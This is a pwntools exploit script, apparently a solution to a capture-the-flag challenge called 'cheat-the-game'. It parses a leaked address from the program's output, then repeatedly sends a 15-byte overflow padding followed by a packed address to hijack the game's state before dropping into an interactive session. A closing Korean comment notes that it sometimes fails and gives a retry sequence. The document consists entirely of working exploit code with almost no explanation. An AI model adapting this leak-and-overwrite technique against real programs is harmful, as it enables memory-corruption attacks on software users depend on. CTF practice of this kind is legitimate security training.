from pwn import *

p = process(["./cheat-the-game/cheat-the-game"])

p.sendline('3')
p.sendline('a')
p.sendline('4')
p.sendline('1')
p.sendline('4')
p.recvuntil('69 ')
address=0
for i in range(0,6):
    address+=(int(p.recvn(2),16))*(2**(8*i))
    p.recvn(1)

address+=47
address=address<<8
for i in range(0,5):
    p.sendline('3')
    p.send(b'a'*15+p64(address))
    p.recvuntil(">>> ")
    p.sendline('2')
    
p.sendline('1')
p.sendline('2')
for i in range(0,10):
    p.recvuntil(">>> ")
    p.sendline('3')
    p.sendline('a')
    p.recvuntil(">>> ")
    p.sendline('2')
p.recvuntil(">>> ")
p.sendline('6')
#gdb.attach(p)
p.interactive()

#스탯이 부족하다고 가끔 안될때도 있는데 3-a-2순으로 누르고 6을 누르면 된다 근데 어떨 땐 그냥 파일이 안 열리거나 무한로딩이 걸리는데 이유를 모르겠음
